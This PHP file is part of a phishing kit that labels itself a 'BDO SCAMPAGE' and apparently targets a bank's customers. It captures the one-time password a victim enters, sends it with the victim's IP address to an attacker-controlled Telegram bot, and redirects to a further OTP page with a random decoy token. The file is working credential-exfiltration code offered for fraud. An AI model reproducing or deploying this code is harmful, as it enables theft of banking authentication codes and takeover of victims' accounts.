<?php
include("../settings/config.php");
     $number = $_GET['number'];


  $otp = $_POST['otp'];

        $request_params = [
            "chat_id" => $user_id,
            "text" => "[BDO SCAMPAGE] \n\n [+] OTP (Unli) [+]\n[+] IP: ".$_SERVER['REMOTE_ADDR']."\n[+] OTP: $otp\n"
        ];
        $request_url = "https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($request_params);
        file_get_contents($request_url);

    

function generateRandomString($length) {
    $include_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    /* Uncomment below to include symbols */
    /* $include_chars .= "[{(!@#$%^/&*_+;?\:)}]"; */
    $charLength = strlen($include_chars);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $include_chars [rand(0, $charLength - 1)];
    }
    return $randomString;
}
 
// Call function
$lenght = 200; # Set result string lenght
$codebash = generateRandomString($lenght);


header("location:../otp2.php?param1=false&auth=$codebash&number=$numb&code=$codebash");
?>